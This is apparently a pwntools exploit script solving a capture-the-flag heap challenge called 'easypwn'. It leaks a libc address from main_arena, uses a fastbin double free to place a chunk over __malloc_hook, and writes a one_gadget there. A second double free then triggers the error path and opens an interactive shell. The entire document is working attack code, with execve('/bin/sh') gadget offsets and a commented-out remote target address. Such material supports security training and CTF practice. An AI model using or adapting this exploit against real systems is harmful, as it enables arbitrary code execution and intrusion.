#!usr/bin/env python
# -*- coding:utf-8 -*-
 
from pwn import*
from LibcSearcher import *

context.log_level ='DEBUG'

r = process('./easypwn')
# r = remote('47.93.30.224',9999)
elf = ELF('./easypwn')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('./libc.so.6')

def add(length,name,color):
    r.recvuntil("Your choice :")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(color)

def visit():
    r.recvuntil("Your choice :")
    r.sendline("2")

def remove(idx):
    r.recvuntil("Your choice :")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def clean():
    r.recvuntil("Your choice :")
    r.sendline("4")


add(0x60,'a'*8,'a'*8)
add(0x60,'a'*8,'a'*8)
add(0x80,'b'*8,'b'*8)
add(0x60,'c'*8,'c'*8)

remove(2)
add(0x20,'d'*8,'e'*8)
# gdb.attach(r)
visit()
r.recvuntil("d"*8)
main_arena = u64(r.recv(6).ljust(8, '\x00'))-0xa +0x20
print hex(main_arena)
obj = LibcSearcher('__malloc_hook',main_arena-0x10)
libc_base = main_arena - 0x3C4B20
print hex(libc_base)
# libc_addr = main_arena-0x10 - obj.dump('__malloc_hook')
# print hex(libc_addr)

# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

one_gadget = libc_base +0xf1207
target = main_arena - 0x33
realloc = libc.symbols['realloc']+libc_base
remove(0)
remove(1)
remove(0)
add(0x60,p64(target),'a')

add(0x60,'b','b')
add(0x60,'c','c')
payload = 'a'*0x13 + p64(one_gadget)# + p64(realloc+4)
add(0x60,payload,'d')
# gdb.attach(r)

#不能再add堆块了
#两次free同一个chunk，触发报错函数
#而调用报错函数的时候又会用到malloc-hook，从而getshell
remove(0)
remove(0)
# r.recvuntil("Your choice :")
# r.sendline("1")

r.interactive()



